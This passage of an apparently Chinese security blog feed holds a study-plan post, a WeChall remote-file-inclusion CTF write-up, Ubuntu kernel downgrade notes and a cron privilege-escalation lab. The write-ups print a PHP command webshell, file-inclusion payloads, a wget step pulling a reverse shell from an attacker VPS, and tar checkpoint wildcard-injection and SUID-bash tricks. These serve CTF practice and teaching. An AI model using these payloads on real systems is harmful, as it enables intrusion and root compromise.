    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>业精于勤荒于嬉，行成于思毁于随</p><h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><p>还有不到一个月，就要进入2021年了。废话不多说。总结一下去年计划完成情况，以及列一下2021年的学习计划。</p><h3 id="2020年年度复盘"><a href="#2020年年度复盘" class="headerlink" title="2020年年度复盘"></a>2020年年度复盘</h3><p>2020年的上半年我是很闲的。众所周知的黑天鹅事件——一场温柔又致命的virus袭击了全球。在死亡人数到达百万之众的情况下，我还留着一条小命。不知道该不该感到庆幸。</p><p>总之还活着呢，最近几年也还要活下去。</p><p>2020计划考oscp，因为疫情断网、隔离、办护照失败。所以此事暂缓。此外在公司工作挺顺利的，几个月内暂时不担心被开除：）</p><p>今年把oscp官方文档都看了一遍，总共有25个章节，八百多页。令人尴尬的是，我发现这本书竟然也是一本初学者入门的书籍，哪怕它有八百多页。</p><p>实战方面，做得很少，都是抽时间周末搞一搞。</p><p>疫情的时候因为无聊，在b站上录视频。也没什么赚它一个亿的小目标。我是一个很佛系的人。所以就随缘做视频，随缘更新了。</p><h2 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h2><p>某师傅指点的原话：</p><p>我其实内心非常鄙视那些天天要什么奇淫技巧的，这种人技术层面绝不会太高。看东西看得不深，把握不住本质。还是那句话，奇淫技巧都是基于你对基础的熟练到一定地步。这时候你会有源源不断的，根本用不完的“奇淫技巧”。<strong>基础不牢，地动山摇</strong></p><p>别人花一年掌握你工作两三年的东西，甚至比你掌握的还牢固。再过几年就知道了，差距都是在不经意间拉开的。绝大部分人，很多年了，其实一直都在原地踏步。公司一倒，或者赶着裁员就凉凉。</p><p>？安服好还是研究岗好</p><p>安服有安服的好处，研究岗有研究岗的好处。建议，在你实战经验非常匮乏的时候，也就是说你整个技术栈都没有很好贯穿运用起来的时候，初期可以去安服。因为实战项目多，有助于快速了解。</p><p>但是安服岗会有瓶颈，因为项目时间有限，搞得下来搞不下来就是写报告。没有给研究的时间，导致自己不能出什么新的成果。</p><p>当你实战经验非常丰富了以后，你往往就想在某个自己喜欢的领域更深入，这时候可以走研究。试想，你自己都没什么实战经验，即使让你研究，也是毫无目的的靠自己瞎搞。能研究出什么有价值的东西？研究是因为你对某些已经非常熟练了，你已经明确的知道你要什么，然后针对性的对某个特定的问题去深入的研究。</p><p>你要深入学习域安全，就直接去看域管理，然后再回过头来看那些域内利用手法，比如你要学集群渗透，就先去学习运维构架。（也就是说从原理出发，从底层出发，而不是学工具的使用方式，工具会很快过时）。</p><h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><p>为了成为一个安全研究人员，我应该做什么呢？</p><h3 id="原理-retired"><a href="#原理-retired" class="headerlink" title="原理(retired)"></a>原理(retired)</h3><p>《精通Windows Server 2008组网技术》</p><p>《Rootkit 系统灰色地带的潜伏者 原书第2版》</p><p>《人月神话》</p><ul><li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#tools">域渗透基础  – 域渗透cheat sheet</a></li><li><a href="https://github.com/microsoft/WindowsProtocolTestSuites">完全掌握上一个链接的内容以后，原理看这个</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">A list of useful payloads and bypasses for Web Application Security</a></li></ul><h3 id="什么是原理"><a href="#什么是原理" class="headerlink" title="什么是原理"></a>什么是原理</h3><p>某大佬指点的原话：</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>我现在的阶段，不是学的越多越好，而是学的越深越好。一通则百通。<br><span class="hljs-bullet">- </span>学深一两个方向，以后再学新技术，新工具会非常快。<br><span class="hljs-bullet">- </span>你光知道很多工具的用法，又有什么用呢。<br><span class="hljs-bullet">- </span>《精通Windows Server 2008组网技术》这本书不是不可以看，但是windows域环境，不还是利用工具？打穿windows域，只要知道正确的套路和工具，就能打穿。<br><span class="hljs-bullet">- </span>你什么技术都学，什么工具都用，没有方法和思路。完全是工具人路线。工具人转型做专家基本是不可能的事。<br><span class="hljs-bullet">- </span>去学原理，看msf的原理，扫描器的原理，提权的原理，看name pipe 系列提权的原理才叫原理。看windows域环境不叫原理。<br><br></code></pre></div></td></tr></table></figure><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>今年组了一个htb的团队，群里学习氛围还是挺不错的。还记得大学的时候，在htb练手，找不到组织和团队，只是自己玩儿。现在的孩子们真是越来越幸福了。暗月说他们那时候学习资料很少的。。。</p><p>哪像现在到处都是，只是缺少沉下心来学习的态度了。</p><ul><li><a href="https://github.com/r0eXpeR/redteam_vul">hw必看-红队中易被攻击的一些重点系统漏洞整理</a></li><li><a href="https://github.com/facebook/chisel">https://github.com/facebook/chisel</a> 基于纯ssh协议的隧道</li><li><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a> 端端ssl加密的隧道</li><li><a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a> 信息搜集工具</li></ul>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Warchall  Live RFI 远程文件包含</title>
    <link href="/2020/12/05/11-x/"/>
    <url>/2020/12/05/11-x/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.wechall.net/challenge/warchall/live_rfi/index.php">题目地址</a></p><p>访问<a href="http://rfi.warchall.net/%E3%80%82">http://rfi.warchall.net/。</a></p><p>web目录fuzz，以及index.php查看源码</p><h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">http:<span class="hljs-comment">//rfi.warchall.net/temp/payload.php?cmd=ls</span><br>conf<span class="hljs-selector-class">.txt</span><br>index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br>live_rfi<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br>payload<span class="hljs-selector-class">.php</span><br>sol.php~<br>sol<span class="hljs-selector-class">.txt</span><br>solution<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br>tplc<br></code></pre></div></td></tr></table></figure><p><a href="http://rfi.warchall.net/temp/payload.php?cmd=pwd">http://rfi.warchall.net/temp/payload.php?cmd=pwd</a></p><p>/home/level/15_live_rfi/www/temp</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-05-11/11.PNG" alt="11"></p><hr><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">http://rfi.warchall.net/temp/payload.php?cmd=ls%20-al%20/home/level/15_live_rfi/www<br><br>total 44<br>drwxr-x---<span class="hljs-number"> 5 </span>root level15<span class="hljs-number"> 4096 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>.<br>drwxr-x---<span class="hljs-number"> 3 </span>root level15<span class="hljs-number"> 4096 </span>May <span class="hljs-number"> 8 </span><span class="hljs-number"> 2012 </span>..<br>drwxr-x---<span class="hljs-number"> 2 </span>root level15<span class="hljs-number"> 4096 </span>May <span class="hljs-number"> 8 </span><span class="hljs-number"> 2012 </span>cache<br>-rwxr-x---<span class="hljs-number"> 1 </span>root level15 <span class="hljs-number"> 168 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>de<br>-rwxr-x---<span class="hljs-number"> 1 </span>root level15 <span class="hljs-number"> 157 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>en<br>-rwxr-x---<span class="hljs-number"> 1 </span>root level15 <span class="hljs-number"> 894 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>index.php<br>-rwxr-x---<span class="hljs-number"> 1 </span>root level15<span class="hljs-number"> 4762 </span>Mar<span class="hljs-number"> 14 </span><span class="hljs-number"> 2014 </span>live_rfi.config.php<br>-rwxr-x---<span class="hljs-number"> 1 </span>root level15 <span class="hljs-number"> 300 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>solution.php<br>drwxrwx---<span class="hljs-number"> 3 </span>root level15<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>temp<br>drwxr-x---<span class="hljs-number"> 4 </span>root level15<span class="hljs-number"> 4096 </span>Jun <span class="hljs-number"> 3 </span><span class="hljs-number"> 2012 </span>tpl<br></code></pre></div></td></tr></table></figure><h3 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h3><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">http://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=temp/payload.php</span><br><br><span class="hljs-string">echo</span> <span class="hljs-string">PHByZT48P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz48L3ByZT4=|</span> <span class="hljs-string">base64</span> <span class="hljs-string">-d</span><br><span class="hljs-string">&lt;pre&gt;&lt;?php</span> <span class="hljs-string">system($_GET[&quot;cmd&quot;]);</span> <span class="hljs-string">?&gt;&lt;/pre&gt;</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">http://rfi.warchall.net/temp/payload.php?cmd=whoami</span><br><br><span class="hljs-string">level15</span><br><span class="hljs-string">权限不够，无法执行wget</span> <span class="hljs-string">shell写入</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">http://rfi.warchall.net/temp/payload.php?cmd=pwd</span><br><br><span class="hljs-string">/home/level/15_live_rfi/www/temp</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">`http://rfi.warchall.net/temp/payload.php?cmd=base64</span> <span class="hljs-string">/home/level/15_live_rfi/www/solution.php`</span><br><br><span class="hljs-string">将solution.php</span> <span class="hljs-string">base64编码，然后本地或者在线网站解码，翻到最下面就可以得到flag。</span><br><br></code></pre></div></td></tr></table></figure><h3 id="尝试写入shell"><a href="#尝试写入shell" class="headerlink" title="尝试写入shell"></a>尝试写入shell</h3><p>本地开启python server，放一个反弹shell的php脚本。</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">curl http://rfi.warchall.net/temp/payload.php?cmd=wget http://vps&#x27;s IP:8080/php-reverse-shell.php -P /tmp/whale.php<br><br><span class="hljs-section">目标机器成功访问vps的php-reverse-shell.php，但没有写入whale.php</span><br><span class="hljs-section">---</span><br>http://rfi.warchall.net/temp/payload.php?cmd=ls /tmp/whale.php<br><br></code></pre></div></td></tr></table></figure><p>没有成功在/tmp目录下写入shell。原因可能是权限太低了。</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><figure class="highlight php-template"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">import requests</span><br><span class="xml"></span><br><span class="xml">url = &quot;http://rfi.warchall.net/index.php&quot;</span><br><span class="xml"></span><br><span class="xml">params = &#123;</span><br><span class="xml">    &quot;lang&quot;: &quot;data://text/plain,</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">print</span> file_get_contents(<span class="hljs-string">&#x27;solution.php&#x27;</span>,<span class="hljs-literal">true</span>);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span><br><span class="xml">&#125;</span><br><span class="xml"></span><br><span class="xml">r = requests.get(url, params=params, verify=False)</span><br><span class="xml">print r.content</span><br><span class="xml"></span><br></code></pre></div></td></tr></table></figure><p>这是个什么操作？</p><p>访问<code>http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php print file_get_contents(&#39;solution.php&#39;,true);?&gt;</code></p><p>反正失败了，没得到solution.php的结果。使用另外一种伪协议php filter</p><p><a href="http://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=/home/level/15_live_rfi/www/solution.php">http://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=/home/level/15_live_rfi/www/solution.php</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> PGh<span class="hljs-number">0</span>bWw+Cjxib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>Pgo<span class="hljs-number">8</span>cHJlPk<span class="hljs-number">5</span>PVEhJTkcgSEVSRT<span class="hljs-number">8</span>/Pz<span class="hljs-number">88</span>L<span class="hljs-number">3</span>ByZT<span class="hljs-number">4</span>KPC<span class="hljs-number">9</span>ib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>Pgo<span class="hljs-number">8</span>L<span class="hljs-number">2</span>h<span class="hljs-number">0</span>bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocCByZXR<span class="hljs-number">1</span>cm<span class="hljs-number">4</span>gJ<span class="hljs-number">0</span>xvd<span class="hljs-number">19</span>INE<span class="hljs-number">5</span>HSU<span class="hljs-number">5</span>HX<span class="hljs-number">0</span>ZydWl<span class="hljs-number">0</span>JzsgPz<span class="hljs-number">4</span>K | base<span class="hljs-number">64</span> -d<br></code></pre></div></td></tr></table></figure><p>同样可以获得solution.php</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>出题方，肯定不会让人写入shell，或者反弹shell，不然服务器稳定性肯定会出问题。说不定会有些人写入垃圾数据塞满磁盘等等。</p><p>rfi和lfi的区别在于，远程文件包含危害更大，可以访问攻击者指定的文件。</p><p>在这里如果<code>http://rfi.warchall.net/temp/payload.php?cmd=wget http://vps&#39;s IP:8080/php-reverse-shell.php -P /tmp/whale.php</code>有写权限的话，就可以得到一个shell。而本地文件包含一般要通过文件上传的方式去传一个shell，然后再通过本地文件包含漏洞去执行，而rfi就不用。</p><p>不过这里payload.php看起来像是远程命令执行漏洞，不是个rfi。而其他人的writeup虽然使用了data伪协议，去访问flag，但看起来好像还是个lfi漏洞。可能是题目没出好。</p><p>感觉没有让做题的人深刻的感受到rfi与lfi的区别，只是用了一下伪协议的知识点。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/7176#toc-5">浅谈文件包含漏洞</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux内核升级&amp;降级</title>
    <link href="/2020/11/30/11-x/"/>
    <url>/2020/11/30/11-x/</url>
    
    <content type="html"><![CDATA[<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>这一切都要从开发不支持docker容器的检测开始说起…… </p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="linux内核升级"><a href="#linux内核升级" class="headerlink" title="linux内核升级"></a>linux内核升级</h2><ol><li>下载deb安装包<br><a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.4-precise/">https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.4-precise/</a></li><li>执行安装</li></ol><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /tmp/<br><br><span class="hljs-attribute">wget</span> -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v<span class="hljs-number">5</span>.<span class="hljs-number">8</span>/amd<span class="hljs-number">64</span>/linux-headers-<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>_<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>.<span class="hljs-number">202008022230</span>_all.deb<br><br><span class="hljs-attribute">wget</span> -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v<span class="hljs-number">5</span>.<span class="hljs-number">8</span>/amd<span class="hljs-number">64</span>/linux-headers-<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>-generic_<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>.<span class="hljs-number">202008022230</span>_amd<span class="hljs-number">64</span>.deb<br><br><span class="hljs-attribute">wget</span> -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v<span class="hljs-number">5</span>.<span class="hljs-number">8</span>/amd<span class="hljs-number">64</span>/linux-image-unsigned-<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>-generic_<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>.<span class="hljs-number">202008022230</span>_amd<span class="hljs-number">64</span>.deb<br><br><span class="hljs-attribute">wget</span> -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v<span class="hljs-number">5</span>.<span class="hljs-number">8</span>/amd<span class="hljs-number">64</span>/linux-modules-<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>-generic_<span class="hljs-number">5</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">050800</span>.<span class="hljs-number">202008022230</span>_amd<span class="hljs-number">64</span>.deb<br></code></pre></div></td></tr></table></figure><p>下载三个安装包</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">一个linux header，<br>一个linux header <span class="hljs-keyword">generic</span><br>一个linux image <span class="hljs-keyword">generic</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/kernel.PNG" alt="kernel"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/9.PNG" alt="9"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/10.PNG" alt="10"></p><p>before linux 5.4 </p><p>after linux 5.8</p><h2 id="linux降级"><a href="#linux降级" class="headerlink" title="linux降级"></a>linux降级</h2><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><h4 id="查看已经安装的linux内核"><a href="#查看已经安装的linux内核" class="headerlink" title="查看已经安装的linux内核"></a>查看已经安装的linux内核</h4><p><code>dpkg --get-selections |grep linux-image</code></p><h4 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h4><p><code>uname -r    </code><br>2.6.32-5-amd64</p><h4 id="查看操作系统分发版本Ubuntu-10-2-0"><a href="#查看操作系统分发版本Ubuntu-10-2-0" class="headerlink" title="查看操作系统分发版本Ubuntu 10.2.0"></a>查看操作系统分发版本Ubuntu 10.2.0</h4><p><code>cat /etc/issue</code><br>Ubuntu 16.04.7 </p><h4 id="查看当前系统中内核的启动顺序"><a href="#查看当前系统中内核的启动顺序" class="headerlink" title="查看当前系统中内核的启动顺序"></a>查看当前系统中内核的启动顺序</h4><p><code>grep menuentry /boot/grub/grub.cfg</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/1.PNG"></p><p>复制图片里面标亮了的字符串。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装三个linux内核源码包<br><code>dpkg --install *.deb</code></p><p>update-grub<br>安装完以后要记得更新</p><p>更新完以后，查看已经安装的linux内核。此时应该已经有了新安装的内核版本。</p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>将字符串<code>Ubuntu, with Linux 3.3.4-030304-generic</code></p><p>4.1.30-040130-generic</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/2.PNG"></p><p><code> vim /etc/default/grub</code><br>修改内核启动顺序</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-30-11/3.PNG"></p><p>“Ubuntu, with Linux 4.1.30-040130-generic”<br>Ubuntu, with Linux 2.6.32-02063269-generic<br>“Ubuntu, with Linux 3.2.1-030201-generic”<br><code>&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 3.3.4-030304-generic&quot;</code></p><p>记得再次更新<code>update-grub</code></p><p>reboot一下试试看</p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>555，我好菜，表哥带带我ORZ…</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://virtualboxes.org/img/ubuntu/">linux虚拟机ova 下载</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux计划任务提权</title>
    <link href="/2020/11/29/09-x/"/>
    <url>/2020/11/29/09-x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">靶机地址<br>ssh <span class="hljs-keyword">user</span><span class="hljs-variable">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.131</span><br>password123<br></code></pre></div></td></tr></table></figure><h2 id="计划任务中的相对路径-amp-绝对路径"><a href="#计划任务中的相对路径-amp-绝对路径" class="headerlink" title="计划任务中的相对路径&amp;绝对路径"></a>计划任务中的相对路径&amp;绝对路径</h2><p>制作的视频教程：<a href="https://www.bilibili.com/video/BV1wA411Y79Q/">https://www.bilibili.com/video/BV1wA411Y79Q/</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#查看计划任务</span><br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <br><span class="hljs-comment">#查找sh脚本</span><br>find <span class="hljs-regexp">/ -name &quot;overwrite.sh&quot; 2&gt;/</span>dev/null<br><br><span class="hljs-comment">#查看权限</span><br>ls -al <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br>-rwxr--rw- <span class="hljs-number">1</span> root staff <span class="hljs-number">40</span> May <span class="hljs-number">13</span>  <span class="hljs-number">2017</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br>Linux 权限模型通过允许给每个文件系统对象设置三种独立的权限级别来工作 — 它们为文件的所有者、文件的组以及所有其他用户。<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>overwrite.sh<br><br>echo <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; <span class="hljs-regexp">/home/u</span>ser/overwrite.sh<br><br>chmod +x <span class="hljs-regexp">/home/u</span>ser/overwrite.sh<br><span class="hljs-regexp">/tmp/</span>bash -p<br></code></pre></div></td></tr></table></figure><h2 id="通配符与进度条提权"><a href="#通配符与进度条提权" class="headerlink" title="通配符与进度条提权"></a>通配符与进度条提权</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">cat /usr/<span class="hljs-keyword">local</span>/bin/compress.sh<br> <br>对tar cxf的解释：https://whale3070.github.io/linux/<span class="hljs-number">2017</span>/<span class="hljs-number">01</span>/<span class="hljs-number">01</span>/%E5%<span class="hljs-number">8</span>E%<span class="hljs-number">8</span>B%E7%BC%A9%E4%B8%<span class="hljs-number">8</span>E%E8%A7%A3%E5%<span class="hljs-number">8</span>E%<span class="hljs-number">8</span>B%E7%BC%A9/<br><br>tar命令与<span class="hljs-keyword">checkpoint</span>：https://www.gnu.org/software/tar/manual/html_section/tar_26.html<br><br>echo <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/<span class="hljs-keyword">user</span>/runme.sh<br>touch /home/<span class="hljs-keyword">user</span>/<span class="hljs-comment">--checkpoint=1</span><br>touch /home/<span class="hljs-keyword">user</span>/<span class="hljs-comment">--checkpoint-action=exec=sh\ runme.sh</span><br>touch /home/<span class="hljs-keyword">user</span>/<span class="hljs-comment">--checkpoint-action=exec=&quot;sh runme.sh&quot;</span><br><br><span class="hljs-comment">---</span><br>**　(<span class="hljs-number">1</span>)   -b, <span class="hljs-comment">--blocking-factor BLOCKS **</span><br><br>**                  BLOCKS x <span class="hljs-number">512</span> bytes per <span class="hljs-type">record</span>**<br><br>                ** 这个用于计算一个记录块是大小．是５１２的倍数**<br><br>**　　（２）<span class="hljs-comment">--checkpoint</span><br>           display progress messages every NUMBERth <span class="hljs-type">record</span> (<span class="hljs-keyword">default</span> <span class="hljs-number">10</span>)**<br><br>　　　　**这个用进度条显示信息，检测数据点的位置，是<span class="hljs-type">record</span>为单位**<br><br>　**　（３）<span class="hljs-comment">--checkpoint-action=ACTION</span><br>           <span class="hljs-keyword">execute</span> ACTION <span class="hljs-keyword">on</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">checkpoint</span>**<br><br>**　　　这个是每个<span 